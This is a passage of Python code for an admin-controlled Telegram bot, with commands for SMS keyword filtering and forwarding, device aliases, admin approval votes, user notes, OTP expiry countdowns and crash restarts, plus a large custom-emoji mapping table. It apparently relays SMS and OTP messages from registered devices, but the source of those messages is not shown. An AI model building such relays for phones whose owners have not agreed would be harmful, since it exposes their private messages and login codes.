        await update.message.reply_text("✅ SMS filter ON — sirf matching SMS forward honge.", parse_mode="HTML")
    elif sub == "off":
        SMS_FILTER_ENABLED = False
        await update.message.reply_text("⬛ SMS filter OFF — sab SMS forward honge.", parse_mode="HTML")
    elif sub == "add" and len(args) > 1:
        kw = " ".join(args[1:]).strip()
        _sms_keyword_filter.add(kw)
        await update.message.reply_text(f"✅ Added: <code>{_lg_esc(kw)}</code>", parse_mode="HTML")
    elif sub == "remove" and len(args) > 1:
        kw = " ".join(args[1:]).strip()
        _sms_keyword_filter.discard(kw)
        await update.message.reply_text(f"🗑 Removed: <code>{_lg_esc(kw)}</code>", parse_mode="HTML")
    elif sub == "clear":
        _sms_keyword_filter.clear()
        await update.message.reply_text("🗑 All keywords cleared.", parse_mode="HTML")
    else:
        await update.message.reply_text("Usage: /smsfilter on | off | add &lt;kw&gt; | remove &lt;kw&gt; | clear", parse_mode="HTML")


# ═══════════════════════════════════════════════════════
#  FEATURE F6 — Device Alias System
# ═══════════════════════════════════════════════════════

def get_device_alias(device_id: str, fallback: str = "") -> str:
    return _device_aliases.get(str(device_id), fallback or str(device_id))

def set_device_alias(device_id: str, alias: str) -> None:
    _device_aliases[str(device_id)] = alias.strip()

async def cmd_alias(update, ctx) -> None:
    if update.effective_user.id not in ADMIN_IDS:
        return
    args = ctx.args
    if len(args) < 2:
        lines = ["📛 <b>Device Aliases</b>", "━━━━━━━━━━━━━━━━━━"]
        if _device_aliases:
            for did, alias in sorted(_device_aliases.items()):
                lines.append(f"<code>{_lg_esc(did)}</code> → <b>{_lg_esc(alias)}</b>")
        else:
            lines.append("No aliases set.")
        lines.append("\nUsage: /alias &lt;device_id&gt; &lt;custom name&gt;")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return
    dev_id = args[0]
    alias  = " ".join(args[1:])
    set_device_alias(dev_id, alias)
    await update.message.reply_text(
        f"✅ Alias set: <code>{_lg_esc(dev_id)}</code> → <b>{_lg_esc(alias)}</b>",
        parse_mode="HTML",
    )


# ═══════════════════════════════════════════════════════
#  FEATURE F7 — Multi-Admin Approval System
# ═══════════════════════════════════════════════════════

def request_approval(action: str, by: int, data: dict, needed: int = MULTI_ADMIN_REQUIRED_VOTES) -> str:
    """Create a pending approval. Returns action_id."""
    aid = _uuid.uuid4().hex[:8]
    _approval_pending[aid] = {
        "action":  action,
        "by":      by,
        "votes":   {by},
        "needed":  needed,
        "data":    data,
        "ts":      _now_ts(),
    }
    return aid

def vote_approval(aid: str, voter_id: int) -> tuple[bool, int, int]:
    """
    Cast a vote. Returns (approved, votes_so_far, votes_needed).
    approved=True means quorum reached.
    """
    p = _approval_pending.get(aid)
    if not p:
        return False, 0, 0
    p["votes"].add(voter_id)
    approved = len(p["votes"]) >= p["needed"]
    if approved:
        _approval_pending.pop(aid, None)
    return approved, len(p["votes"]), p["needed"]

async def notify_admins_approval(bot, aid: str, action: str, by: int) -> None:
    """DM all admins to vote on a pending action."""
    from telegram import InlineKeyboardMarkup as IKM, InlineKeyboardButton as IKB
    markup = IKM([[
        IKB("✅ Approve", callback_data=f"approve:{aid}"),
        IKB("❌ Reject",  callback_data=f"reject:{aid}"),
    ]])
    text = (
        f"⚠️ <b>Approval Required</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Action: <b>{_lg_esc(action)}</b>\n"
        f"Requested by: <code>{by}</code>\n"
        f"Votes needed: <b>{MULTI_ADMIN_REQUIRED_VOTES}</b>\n"
        f"ID: <code>{aid}</code>"
    )
    for admin_id in ADMIN_IDS:
        if admin_id != by:
            try:
                await bot.send_message(admin_id, text, parse_mode="HTML", reply_markup=markup)
            except Exception:
                pass

async def handle_approval_callback(query, ctx) -> bool:
    """Wire into _on_callback_impl. Returns True if handled."""
    data = query.data or ""
    if not (data.startswith("approve:") or data.startswith("reject:")):
        return False
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("No access.", show_alert=True)
        return True

    action_type, aid = data.split(":", 1)
    if action_type == "reject":
        _approval_pending.pop(aid, None)
        await query.answer("❌ Action rejected.", show_alert=True)
        try:
            await query.message.edit_reply_markup(reply_markup=None)
        except Exception:
            pass
        return True

    approved, votes, needed = vote_approval(aid, query.from_user.id)
    if approved:
        await query.answer(f"✅ Approved! ({votes}/{needed})", show_alert=True)
        await _lg_notify(ctx.bot, f"✅ <b>APPROVAL GRANTED</b>\nID: <code>{aid}</code>\nVotes: {votes}/{needed}")
    else:
        await query.answer(f"Vote cast ({votes}/{needed}). Waiting for more.", show_alert=True)
    try:
        await query.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass
    return True


# ═══════════════════════════════════════════════════════
#  FEATURE F8 — User Notes System
# ═══════════════════════════════════════════════════════

async def cmd_note(update, ctx) -> None:
    if update.effective_user.id not in ADMIN_IDS:
        return
    args = ctx.args
    if not args:
        await update.message.reply_text(
            "Usage:\n"
            "/note &lt;user_id&gt; &lt;text&gt; — add note\n"
            "/notes &lt;user_id&gt; — view notes\n"
            "/delnote &lt;user_id&gt; &lt;index&gt; — delete note",
            parse_mode="HTML",
        )
        return
    try:
        uid = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.", parse_mode="HTML")
        return
    note_text = " ".join(args[1:]).strip()
    if not note_text:
        await update.message.reply_text("❌ Note text required.", parse_mode="HTML")
        return
    _user_notes[uid].append({
        "ts":   _now_ts(),
        "note": note_text,
        "by":   update.effective_user.id,
    })
    uname = all_users.get(uid, {}).get("name", str(uid))
    await update.message.reply_text(
        f"📝 Note added for <b>{_lg_esc(str(uname))}</b> (<code>{uid}</code>)\n"
        f"<code>{_lg_esc(note_text)}</code>",
        parse_mode="HTML",
    )

async def cmd_notes(update, ctx) -> None:
    if update.effective_user.id not in ADMIN_IDS:
        return
    args = ctx.args
    if not args:
        await update.message.reply_text("Usage: /notes &lt;user_id&gt;", parse_mode="HTML")
        return
    try:
        uid = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.", parse_mode="HTML")
        return
    notes = _user_notes.get(uid, [])
    uname = all_users.get(uid, {}).get("name", str(uid))
    if not notes:
        await update.message.reply_text(
            f"📝 No notes for <b>{_lg_esc(str(uname))}</b> (<code>{uid}</code>).",
            parse_mode="HTML",
        )
        return
    lines = [f"📝 <b>Notes for {_lg_esc(str(uname))} ({uid})</b>", "━━━━━━━━━━━━━━━━━━"]
    for i, n in enumerate(notes, 1):
        dt = datetime.fromtimestamp(n["ts"]).strftime("%d %b %H:%M")
        lines.append(f"{i}. [{dt}] {_lg_esc(n['note'])}")
    await update.message.reply_text("\n".join(lines), parse_mode="HTML")

async def cmd_delnote(update, ctx) -> None:
    if update.effective_user.id not in ADMIN_IDS:
        return
    args = ctx.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /delnote &lt;user_id&gt; &lt;index&gt;", parse_mode="HTML")
        return
    try:
        uid = int(args[0])
        idx = int(args[1]) - 1
    except ValueError:
        await update.message.reply_text("❌ Invalid args.", parse_mode="HTML")
        return
    notes = _user_notes.get(uid, [])
    if not (0 <= idx < len(notes)):
        await update.message.reply_text("❌ Index out of range.", parse_mode="HTML")
        return
    removed = notes.pop(idx)
    await update.message.reply_text(
        f"🗑 Deleted note {idx+1}: <code>{_lg_esc(removed['note'])}</code>",
        parse_mode="HTML",
    )


# ═══════════════════════════════════════════════════════
#  FEATURE F9 — Auto-Restart on Crash
# ═══════════════════════════════════════════════════════

async def crash_alert(bot, error: Exception, context: str = "") -> None:
    """Call from top-level exception handler before restart."""
    tb = traceback.format_exc()[-2000:]
    text = (
        "💥 <b>BOT CRASH DETECTED</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"Context: <code>{_lg_esc(context)}</code>\n"
        f"Error: <code>{_lg_esc(type(error).__name__)}: {_lg_esc(str(error)[:200])}</code>\n"
        f"<pre>{_lg_esc(tb)}</pre>\n"
        "🔄 Attempting restart..."
    )
    # Send to log channel + all duty admins
    await _lg_notify(bot, text, critical=True)
    for admin_id in duty_alert_targets():
        if admin_id == ADMIN_DM_ID:
            continue  # already sent via _lg_notify critical
        try:
            await bot.send_message(admin_id, text, parse_mode="HTML")
        except Exception:
            pass

def setup_crash_handler() -> None:
    """
    Wraps the main poll/webhook run with auto-restart.
    Call this in __main__ block instead of bare main().
    """
    import sys
    import subprocess

    max_restarts = 10
    restarts = 0
    while restarts < max_restarts:
        try:
            main()   # main() is sync — calls detect_and_run() which blocks
            break
        except KeyboardInterrupt:
            break
        except Exception as e:
            restarts += 1
            tlog(f"CRASH #{restarts}: {e}")
            time.sleep(min(5 * restarts, 60))  # capped backoff
    else:
        tlog("Max restarts reached. Exiting.")


# ═══════════════════════════════════════════════════════
#  FEATURE F10 — Paginated User List
# ═══════════════════════════════════════════════════════

PAGE_SIZE_USERS = 10

def _build_user_list_cache(query_str: str = "") -> list[tuple]:
    """Returns list of (uid, name, status) filtered by query."""
    out = []
    for uid, u in all_users.items():
        name   = str(u.get("name", "?"))
        status = "✅" if uid in allowed_users else "❌"
        if uid in ADMIN_IDS:
            status = "👑"
        if query_str and query_str.lower() not in name.lower() and query_str not in str(uid):
            continue
        out.append((uid, name, status))
    out.sort(key=lambda x: x[1].lower())
    return out

async def cmd_users_paginated(update, ctx) -> None:
    if update.effective_user.id not in ADMIN_IDS:
        return
    query_str = " ".join(ctx.args) if ctx.args else ""
    cache = _build_user_list_cache(query_str)
    await _send_user_page(update.message.chat_id, 0, cache, ctx.bot, query_str, is_new=True, update=update)

async def _send_user_page(chat_id: int, page: int, cache: list, bot, query_str: str, is_new: bool = False, update=None, msg_id: int = None) -> None:
    from telegram import InlineKeyboardMarkup as IKM, InlineKeyboardButton as IKB
    total   = len(cache)
    pages   = max(1, (total + PAGE_SIZE_USERS - 1) // PAGE_SIZE_USERS)
    page    = max(0, min(page, pages - 1))
    start   = page * PAGE_SIZE_USERS
    chunk   = cache[start:start + PAGE_SIZE_USERS]

    lines = [
        f"👥 <b>Users</b> ({total} total{'  🔍 ' + _lg_esc(query_str) if query_str else ''})",
        f"Page {page+1}/{pages}",
        "━━━━━━━━━━━━━━━━━━",
    ]
    for uid, name, status in chunk:
        lines.append(f"{status} <b>{_lg_esc(name)}</b> <code>{uid}</code>")

    text = "\n".join(lines)
    nav  = []
    if page > 0:
        nav.append(IKB("◀ Prev", callback_data=f"upage:{page-1}:{query_str}"))
    if page < pages - 1:
        nav.append(IKB("Next ▶", callback_data=f"upage:{page+1}:{query_str}"))

    markup = IKM([nav]) if nav else None

    if is_new and update:
        await update.message.reply_text(text, parse_mode="HTML", reply_markup=markup)
    elif msg_id:
        try:
            await bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=markup)
        except Exception:
            pass

async def handle_upage_callback(query, ctx) -> bool:
    """Wire into _on_callback_impl. Returns True if handled."""
    data = query.data or ""
    if not data.startswith("upage:"):
        return False
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("No access.", show_alert=True)
        return True
    # safe split: "upage:<page>:<optional_query>" — query may contain ":"
    _upage_parts = data[len("upage:"):].split(":", 1)
    try:
        page = int(_upage_parts[0])
    except (ValueError, IndexError):
        page = 0
    query_str = _upage_parts[1] if len(_upage_parts) > 1 else ""
    cache      = _build_user_list_cache(query_str)
    await query.answer()
    await _send_user_page(
        query.message.chat_id, page, cache, ctx.bot, query_str,
        is_new=False, msg_id=query.message.message_id,
    )
    return True


# ═══════════════════════════════════════════════════════
#  FEATURE F11 — OTP Expiry Countdown
# ═══════════════════════════════════════════════════════

async def otp_countdown_loop() -> None:
    """Background task — edits OTP messages with countdown every 30s."""
    while True:
        try:
            now  = _now_ts()
            dead = []
            for msg_id, info in list(_otp_countdown_msgs.items()):
                left = int(info["expire_ts"] - now)
                markup = info.get("markup")   # may be None or IKM
                if left <= 0:
                    dead.append(msg_id)
                    try:
                        await info["bot"].edit_message_text(
                            info["base_text"] + "\n<code>⏳ OTP Expired</code>",
                            chat_id=info["chat_id"],
                            message_id=msg_id,
                            parse_mode="HTML",
                            reply_markup=markup,
                        )
                    except Exception:
                        pass
                    continue
                mins, secs = divmod(left, 60)
                # Only update on clean 30s boundaries to avoid MessageNotModified
                new_text = info["base_text"] + f"\n<code>⏳ Expires in {mins}m {secs:02d}s</code>"
                if new_text == info.get("_last_text"):
                    continue
                info["_last_text"] = new_text
                try:
                    await info["bot"].edit_message_text(
                        new_text,
                        chat_id=info["chat_id"],
                        message_id=msg_id,
                        parse_mode="HTML",
                        reply_markup=markup,
                    )
                except Exception:
                    pass
            for mid in dead:
                _otp_countdown_msgs.pop(mid, None)
        except Exception:
            pass
        await asyncio.sleep(30)

def register_otp_countdown(bot, chat_id: int, msg_id: int, base_text: str, markup=None) -> None:
    _otp_countdown_msgs[msg_id] = {
        "bot":       bot,
        "chat_id":   chat_id,
        "msg_id":    msg_id,
        "base_text": base_text,
        "expire_ts": _now_ts() + OTP_EXPIRE_SECS,
        "markup":    markup,
    }


# ═══════════════════════════════════════════════════════
#  FEATURE F12 — Webhook vs Polling Auto-Switch
# ═══════════════════════════════════════════════════════

def detect_and_run(app) -> None:
    """
    Try webhook first (checks WEBHOOK_URL env).
    Falls back to polling if webhook setup fails.
    Both run_webhook and run_polling are sync PTB blocking calls.
    Admin startup log sent via post_init (async context) instead.
    """
    webhook_url = os.environ.get("WEBHOOK_URL", "").strip()
    port        = int(os.environ.get("PORT", "8080"))

    if webhook_url:
        try:
            tlog(f"Webhook mode: {webhook_url}")
            app.run_webhook(
                listen="0.0.0.0",
                port=port,
                url_path="webhook",
                webhook_url=f"{webhook_url.rstrip('/')}/webhook",
                drop_pending_updates=True,
                allowed_updates=["message", "callback_query"],
            )
            return
        except Exception as e:
            tlog(f"Webhook failed ({e}), falling back to polling")

    tlog("Polling mode")
    app.run_polling(drop_pending_updates=True)

# ═══════════════════════════════════════════════════════
#  END LOGGER STACK
# ═══════════════════════════════════════════════════════

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.error import Conflict, Forbidden, TelegramError, ChatMigrated
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ═══════════════════════════════════════════════════════
#  PREMIUM CUSTOM EMOJI UI
#  Telegram custom emoji IDs supplied by the owner.
#  Text uses <tg-emoji>; inline buttons use the Bot API
#  icon_custom_emoji_id field through PTB api_kwargs so this
#  remains usable with python-telegram-bot v22.5.
# ═══════════════════════════════════════════════════════

PREMIUM_EMOJI_IDS = (
    "5224607267797606837",
    "5404561694510833322",
    "6206446249181189526",
    "5206318837489743801",
    "5235588635885054955",
    "6206479140040743133",
    "5440621591387980068",
    "5246772116543512028",
    "5253742260054409879",
    "5339233635620899144",
    "6206497372176913599",
    "6206404510689007446",
    "6204162490515855272",
    "5372849966689566579",
    "6206174450765796040",
    "5339286072876614251",
)

_PREMIUM_INDEX = 0
_PTB_INLINE_KEYBOARD_BUTTON = None

logging.basicConfig(
    format="%(asctime)s — %(name)s — %(levelname)s — %(message)s",
    level=logging.WARNING,
)


# Keep the original PTB class under a private alias.
_PTB_INLINE_KEYBOARD_BUTTON = InlineKeyboardButton
try:
    from telegram import CopyTextButton as _PTB_COPY_TEXT_BUTTON
except Exception:  # older PTB fallback
    _PTB_COPY_TEXT_BUTTON = None

def premium_emoji(emoji_id: Optional[str] = None, fallback: str = "⭐️") -> str:
    """Return a Telegram custom emoji entity for HTML messages."""
    global _PREMIUM_INDEX
    if emoji_id is None:
        emoji_id = PREMIUM_EMOJI_IDS[_PREMIUM_INDEX % len(PREMIUM_EMOJI_IDS)]
        _PREMIUM_INDEX += 1
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'


# ── Emoji sanitizer: strip ALL non-premium emoji from inline button text ──
_EMOJI_RANGES = (
    (0x1F000, 0x1FAFF),
    (0x2600, 0x27BF),
    (0x1F1E6, 0x1F1FF),
    (0x2B00, 0x2BFF),
    (0xFE00, 0xFE0F),
    (0x1F900, 0x1F9FF),
    (0xE0020, 0xE007F),
)
# NOTE: 0x2000-0x206F (dashes, bullets, quotes, ellipsis) and 0x2190-0x21FF
# (plain arrows like ->) are deliberately NOT treated as emoji so that normal
# punctuation in messages survives untouched.
_EMOJI_SINGLE = {0x3030, 0x303D, 0x2139, 0x200D, 0x20E3, 0xFE0F}


def _is_emoji_char(ch: str) -> bool:
    cp = ord(ch)
    if cp in _EMOJI_SINGLE:
        return True
    for lo, hi in _EMOJI_RANGES:
        if lo <= cp <= hi:
            return True
    return False


def strip_emoji(text: str) -> str:
    """Remove emoji / pictographs / symbols from a string."""
    cleaned = "".join(ch for ch in (text or "") if not _is_emoji_char(ch))
    cleaned = re.sub(r"\s{2,}", " ", cleaned).strip()
    cleaned = re.sub(r"^[/|:\-\u2013\u2014\s]+", "", cleaned)
    cleaned = re.sub(r"[/|:\-\u2013\u2014\s]+$", "", cleaned)
    return cleaned.strip()


# ── Premium emoji upgrade map (verified via getCustomEmojiStickers) ──
PREMIUM_EMOJI_MAP = {
    "\u2604": "5224607267797606837",
    "\u2604\ufe0f": "5224607267797606837",
    "\U0001F4B8": "5404561694510833322",
    "\U0001F50D": "6206446249181189526",
    "\U0001F4AF": "5206318837489743801",
    "\U0001F3B2": "5235588635885054955",
    "\u2714": "6206479140040743133",
    "\u2714\ufe0f": "6206479140040743133",
    "\U0001F51C": "5440621591387980068",
    "\u26D4": "5246772116543512028",
    "\u26D4\ufe0f": "5246772116543512028",
    "\u2709": "5253742260054409879",
    "\u2709\ufe0f": "5253742260054409879",
    "\U0001F517": "6206497372176913599",
    "\u2B50": "6206404510689007446",
    "\u2B50\ufe0f": "6206404510689007446",
    "\u270F": "6204162490515855272",
    "\u270F\ufe0f": "6204162490515855272",
    "\U0001F6F8": "5372849966689566579",
    "\u26A0": "6206174450765796040",
    "\u26A0\ufe0f": "6206174450765796040",
    "\u270B": "5339286072876614251",
    "\u270B\ufe0f": "5339286072876614251",
    # Extra common emoji -> nearest verified premium icon.
    "\u2705": "6206479140040743133",          # ✅ -> premium ✔️
    "\u274C": "5246772116543512028",          # ❌ -> premium ⛔️
    "\u26A1": "5224607267797606837",          # ⚡ -> premium ☄️
    "\u2728": "6206404510689007446",          # ✨ -> premium ⭐️
    "\u2753": "6206174450765796040",          # ❓ -> premium ⚠️
    "\u2726": "6206404510689007446",          # ✦  -> premium ⭐️
    "\U0001F525": "5224607267797606837",      # 🔥 -> premium ☄️
    "\U0001F680": "5372849966689566579",      # 🚀 -> premium ✈️
    "\U0001F4E7": "5253742260054409879",      # 📧 -> premium ✉️
    "\U0001F4E8": "5253742260054409879",      # 📨 -> premium ✉️
    "\U0001F4E4": "5372849966689566579",      # 📤 -> premium ✈️
    "\U0001F512": "5339286072876614251",      # 🔒 -> premium ✋
    "\U0001F513": "5339286072876614251",      # 🔓 -> premium ✋
    "\U0001F6AB": "5246772116543512028",      # 🚫 -> premium ⛔️
    "\U0001F4A1": "6206404510689007446",      # 💡 -> premium ⭐️
    "\U0001F4CA": "5206318837489743801",      # 📊 -> premium 💯
    "\U0001F4C8": "5206318837489743801",      # 📈 -> premium 💯
    "\U0001F4C9": "5206318837489743801",      # 📉 -> premium 💯
    "\U0001F3AF": "5235588635885054955",      # 🎯 -> premium 🎲
    "\U0001F3C6": "5206318837489743801",      # 🏆 -> premium 💯
    "\U0001F4B0": "5404561694510833322",      # 💰 -> premium 💸
    "\U0001F4B5": "5404561694510833322",      # 💵 -> premium 💸
    "\U0001F4B4": "5404561694510833322",      # 💴 -> premium 💸
    "\U0001F4B6": "5404561694510833322",      # 💶 -> premium 💸
    "\U0001F4B7": "5404561694510833322",      # 💷 -> premium 💸
    "\U0001F4B3": "5404561694510833322",      # 💳 -> premium 💸
    "\U0001F381": "5440621591387980068",      # 🎁 -> premium 🔜
    "\U0001F389": "5440621591387980068",      # 🎉 -> premium 🔜
    "\U0001F4AC": "5253742260054409879",      # 💬 -> premium ✉️
    "\U0001F4DD": "6204162490515855272",      # 📝 -> premium ✏️
    "\U0001F4CB": "6204162490515855272",      # 📋 -> premium ✏️
    "\U0001F4C4": "6204162490515855272",      # 📄 -> premium ✏️
    "\U0001F4C1": "6206497372176913599",      # 📁 -> premium 🔗
    "\U0001F4BE": "6206497372176913599",      # 💾 -> premium 🔗
    "\U0001F4E6": "6206497372176913599",      # 📦 -> premium 🔗
    "\U0001F517": "6206497372176913599",      # 🔗 -> premium 🔗
    "\U0001F511": "6206497372176913599",      # 🔑 -> premium 🔗
    "\U0001F510": "5339286072876614251",      # 🔐 -> premium ✋
    "\U0001F6E1": "6206479140040743133",      # 🛡 -> premium ✔️
    "\U0001F6A8": "6206174450765796040",      # 🚨 -> premium ⚠️
    "\U0001F465": "6206446249181189526",      # 👥 -> premium 🔍
    "\U0001F464": "6206446249181189526",      # 👤 -> premium 🔍
    "\U0001F50E": "6206446249181189526",      # 🔎 -> premium 🔍
    "\U0001F4BB": "6204162490515855272",      # 💻 -> premium ✏️
    "\U0001F5A5": "6204162490515855272",      # 🖥 -> premium ✏️
    "\U0001F310": "6206497372176913599",      # 🌐 -> premium 🔗
    "\U0001F4F1": "5253742260054409879",      # 📱 -> premium ✉️
    "\U0001F4F2": "5253742260054409879",      # 📲 -> premium ✉️
    "\U0001F504": "5235588635885054955",      # 🔄 -> premium 🎲
    "\U0001F5D1": "5246772116543512028",      # 🗑 -> premium ⛔️
    "\U0001F527": "6204162490515855272",      # 🔧 -> premium ✏️
    "\U0001F528": "6204162490515855272",      # 🔨 -> premium ✏️
    "\U0001F6E0": "6204162490515855272",      # 🛠 -> premium ✏️
    "\U0001F44D": "6206479140040743133",      # 👍 -> premium ✔️
    "\U0001F44E": "5246772116543512028",      # 👎 -> premium ⛔️
    "\U0001F4A5": "5224607267797606837",      # 💥 -> premium ☄️
    "\U0001F4A3": "5224607267797606837",      # 💣 -> premium ☄️
    "\U0001F947": "5206318837489743801",      # 🥇 -> premium 💯
    "\U0001F4B9": "5206318837489743801",      # 💹 -> premium 💯
    "\U0001F4B2": "5404561694510833322",      # 💲 -> premium 💸
    "\U0001F550": "5440621591387980068",      # 🕐 -> premium 🔜
    "\u231A": "5440621591387980068",          # ⌚ -> premium 🔜
    "\U0001F4C5": "6204162490515855272",      # 📅 -> premium ✏️
    "\U0001F4C6": "6204162490515855272",      # 📆 -> premium ✏️
    "\U0001F4CD": "6206497372176913599",      # 📍 -> premium 🔗
    "\U0001F4CE": "6206497372176913599",      # 📎 -> premium 🔗
    "\U0001F4D1": "6204162490515855272",      # 📑 -> premium ✏️
    "\U0001F4D6": "6204162490515855272",      # 📖 -> premium ✏️
    "\U0001F4DA": "6204162490515855272",      # 📚 -> premium ✏️
    "\U0001F4E2": "5253742260054409879",      # 📢 -> premium ✉️
    "\U0001F4E3": "5253742260054409879",      # 📣 -> premium ✉️
    "\U0001F514": "6206174450765796040",      # 🔔 -> premium ⚠️
    "\U0001F515": "6206174450765796040",      # 🔕 -> premium ⚠️
    "\U0001F6AA": "6206497372176913599",      # 🚪 -> premium 🔗
    "\U0001F6A9": "6206174450765796040",      # 🚩 -> premium ⚠️
    "\U0001F3F3": "6206174450765796040",      # 🏳 -> premium ⚠️
    "\U0001F3F4": "6206174450765796040",      # 🏴 -> premium ⚠️
    "\U0001F9F9": "6204162490515855272",      # 🧹 -> premium ✏️
    "\U0001F9F0": "6204162490515855272",      # 🧰 -> premium ✏️
    "\U0001F9EA": "5235588635885054955",      # 🧪 -> premium 🎲
    "\U0001F9EC": "5235588635885054955",      # 🧬 -> premium 🎲
    "\U0001F4A4": "5440621591387980068",      # 💤 -> premium 🔜
    "\U0001F3AE": "5235588635885054955",      # 🎮 -> premium 🎲
    "\U0001F3B5": "5440621591387980068",      # 🎵 -> premium 🔜
    "\U0001F3B6": "5440621591387980068",      # 🎶 -> premium 🔜
    "\U0001F3A8": "5235588635885054955",      # 🎨 -> premium 🎲
    "\U0001F30D": "6206497372176913599",      # 🌍 -> premium 🔗
    "\U0001F30E": "6206497372176913599",      # 🌎 -> premium 🔗
    "\U0001F30F": "6206497372176913599",      # 🌏 -> premium 🔗
    "\U0001F319": "5440621591387980068",      # 🌙 -> premium 🔜
    "\u2600": "5224607267797606837",          # ☀ -> premium ☄️
    "\u2600\ufe0f": "5224607267797606837",
    "\u2601": "6206174450765796040",          # ☁ -> premium ⚠️
    "\u2601\ufe0f": "6206174450765796040",
    "\u2614": "5404561694510833322",          # ☔ -> premium 💸
    "\u2615": "5440621591387980068",          # ☕ -> premium 🔜
    "\u267B": "6206479140040743133",          # ♻ -> premium ✔️
    "\u267B\ufe0f": "6206479140040743133",
    "\u2693": "6206497372176913599",          # ⚓ -> premium 🔗
    "\u2694": "5224607267797606837",          # ⚔ -> premium ☄️
    "\u2694\ufe0f": "5224607267797606837",
    "\u2696": "6206479140040743133",          # ⚖ -> premium ✔️
    "\u2696\ufe0f": "6206479140040743133",
    "\u2699": "5235588635885054955",          # ⚙ -> premium 🎲
    "\u2699\ufe0f": "5235588635885054955",
    "\u26AB": "5246772116543512028",          # ⚫ -> premium ⛔️
    "\u26AB\ufe0f": "5246772116543512028",
    "\u26D3": "6206497372176913599",          # ⛓ -> premium 🔗
    "\u26D3\ufe0f": "6206497372176913599",
    "\u27A1": "6206497372176913599",          # ➡ -> premium 🔗
    "\u27A1\ufe0f": "6206497372176913599",
    "\u2B05": "6206497372176913599",          # ⬅ -> premium 🔗
    "\u2B05\ufe0f": "6206497372176913599",
    "\u2B06": "6206497372176913599",          # ⬆ -> premium 🔗
    "\u2B06\ufe0f": "6206497372176913599",
    "\u2B07": "6206497372176913599",          # ⬇ -> premium 🔗
    "\u2B07\ufe0f": "6206497372176913599",
    "\u2795": "6206479140040743133",          # ➕ -> premium ✔️
    "\u2796": "5246772116543512028",          # ➖ -> premium ⛔️
    "\u2716": "5246772116543512028",          # ✖ -> premium ⛔️
    "\u2716\ufe0f": "5246772116543512028",
    "\u2733": "6206404510689007446",          # ✳ -> premium ⭐️
    "\u2733\ufe0f": "6206404510689007446",
    "\u2734": "6206404510689007446",          # ✴ -> premium ⭐️
    "\u2734\ufe0f": "6206404510689007446",
    "\u2747": "6206404510689007446",          # ❇ -> premium ⭐️
    "\u2747\ufe0f": "6206404510689007446",
    "\u2744": "5224607267797606837",          # ❄ -> premium ☄️
    "\u2744\ufe0f": "5224607267797606837",
    "\u2764": "6206404510689007446",          # ❤ -> premium ⭐️
    "\u2764\ufe0f": "6206404510689007446",
    "\U0001F495": "6206404510689007446",      # 💕 -> premium ⭐️
    "\U0001F496": "6206404510689007446",      # 💖 -> premium ⭐️
    "\U0001F497": "6206404510689007446",      # 💗 -> premium ⭐️
    "\U0001F49A": "6206404510689007446",      # 💚 -> premium ⭐️
    "\U0001F499": "6206404510689007446",      # 💙 -> premium ⭐️
    "\U0001F49B": "6206404510689007446",      # 💛 -> premium ⭐️
    "\U0001F49C": "6206404510689007446",      # 💜 -> premium ⭐️
    "\U0001F5A4": "5246772116543512028",      # 🖤 -> premium ⛔️
    "\U0001F494": "5246772116543512028",      # 💔 -> premium ⛔️
    "\U0001F620": "6206174450765796040",      # 😠 -> premium ⚠️
    "\U0001F621": "6206174450765796040",      # 😡 -> premium ⚠️
    "\U0001F600": "6206479140040743133",      # 😀 -> premium ✔️
    "\U0001F601": "6206479140040743133",      # 😁 -> premium ✔️
    "\U0001F602": "6206479140040743133",      # 😂 -> premium ✔️
    "\U0001F60A": "6206479140040743133",      # 😊 -> premium ✔️
    "\U0001F642": "6206479140040743133",      # 🙂 -> premium ✔️
    "\U0001F44C": "6206479140040743133",      # 👌 -> premium ✔️
    "\U0001F64F": "6206479140040743133",      # 🙏 -> premium ✔️
    "\U0001F4AA": "6206479140040743133",      # 💪 -> premium ✔️
    "\U0001F440": "6206446249181189526",      # 👀 -> premium 🔍
    "\U0001F9E0": "5235588635885054955",      # 🧠 -> premium 🎲
    "\U0001F4A2": "6206174450765796040",      # 💢 -> premium ⚠️
    "\U0001F4A8": "5440621591387980068",      # 💨 -> premium 🔜
    "\U0001F32A": "6206174450765796040",      # 🌪 -> premium ⚠️
    "\U0001F32A\ufe0f": "6206174450765796040",
    "\U0001F525": "5224607267797606837",
    "\u2708": "5372849966689566579",          # ✈ -> premium ✈️
    "\u2708\ufe0f": "5372849966689566579",
    "\U0001F6F8": "5372849966689566579",      # 🛸 -> premium ✈️
    "\U0001F6EB": "5372849966689566579",      # 🛫 -> premium ✈️
    "\U0001F6EC": "5372849966689566579",      # 🛬 -> premium ✈️
    "\U0001F697": "5372849966689566579",      # 🚗 -> premium ✈️
    "\U0001F3CD": "5372849966689566579",      # 🏍 -> premium ✈️
    "\U0001F6B2": "5372849966689566579",      # 🚲 -> premium ✈️
    "\U0001F4E1": "6206446249181189526",      # 📡 -> premium 🔍
    "\U0001F5B1": "6204162490515855272",      # 🖱 -> premium ✏️
    "\u2328": "6204162490515855272",          # ⌨ -> premium ✏️
    "\u2328\ufe0f": "6204162490515855272",
    "\U0001F4BD": "6206497372176913599",      # 💽 -> premium 🔗
    "\U0001F4BF": "6206497372176913599",      # 💿 -> premium 🔗
    "\U0001F4C0": "6206497372176913599",      # 📀 -> premium 🔗
    "\U0001F9F1": "6206497372176913599",      # 🧱 -> premium 🔗
    "\U0001F3E0": "6206497372176913599",      # 🏠 -> premium 🔗
    "\U0001F3E2": "6206497372176913599",      # 🏢 -> premium 🔗
    "\U0001F3AD": "5235588635885054955",      # 🎭 -> premium 🎲
    "\U0001F3C1": "6206174450765796040",      # 🏁 -> premium ⚠️
    "\U0001F3F8": "5235588635885054955",      # 🏸 -> premium 🎲
